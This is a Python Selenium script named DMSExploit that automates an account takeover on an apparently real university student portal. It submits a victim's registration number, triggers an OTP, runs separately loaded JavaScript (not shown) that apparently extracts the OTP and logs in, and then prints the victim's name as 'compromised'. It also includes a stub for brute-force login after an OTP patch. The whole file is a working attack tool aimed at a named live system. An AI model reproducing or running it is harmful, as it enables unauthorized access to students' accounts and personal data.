#!/usr/bin/python3

import os
import time
import emoji
from selenium import webdriver


class DMSExploit:

    def __init__(self, reg_number):
        """
        Initializing the DMSExploit object with member variables like:
        Registration Number, Selenium WebDriver, login-script.js, load-jQuery.js,
        otp-send.js and exploit.js
        """
        self.reg_number = reg_number
        self.driver = webdriver.Chrome('/usr/bin/chromedriver')
        self.login_script = str(open('js/login-script.js', 'r').read()).replace(
            'reg_number', self.reg_number)
        self.load_jQuery = str(
            open('js/load-jQuery.js', 'r').read())
        self.otp_send = str(open('js/otp-send.js', 'r').read())
        self.exploit = str(open('js/exploit.js', 'r').read())

    def open_dms(self):
        """
        Selnium WebDriver opens the browser window and starts executing the 
        JavaScript code snippet's one by one and thus finally logging into the 
        portal with the OTP
        """
        self.driver.get('https://dms.jaipur.manipal.edu/Loginform.aspx')

        # Inserting the registration number and doing a student login
        print('executing login-script')
        self.execute_script_with_jquery(
            self.load_jQuery, self.login_script)
        time.sleep(1)

        # Sending the OTP
        print('executing otp-send')
        self.execute_script_with_jquery(
            self.load_jQuery, self.otp_send, wait=True)

        # Extracting the OTP and logging in
        print('executing exploit :)')
        self.execute_script_with_jquery(
            self.load_jQuery, self.exploit)

        # Extracting victim data
        victim = self.driver.find_element_by_id(
            'ContentPlaceHolder1_txtStudentName').get_attribute('value')

        # Print victim data on successfull execution of program
        print(emoji.emojize('{} is compromised :thumbs_up:').format(victim))

    def brute_force_login(self):
        """
        Brute force login to dms after the OTP Patch
        """
        pass

    def execute_script_with_jquery(self, initial_script, final_script, wait=False, delay=1):
        """
        Executes two small JavaScript code snippets one at a time
        If their is a small transition on action we add a slight delay,
        to let the browser load and execute the next script.
        """

        self.driver.execute_script(initial_script)
        if wait:
            time.sleep(delay)
        self.driver.execute_script(final_script)
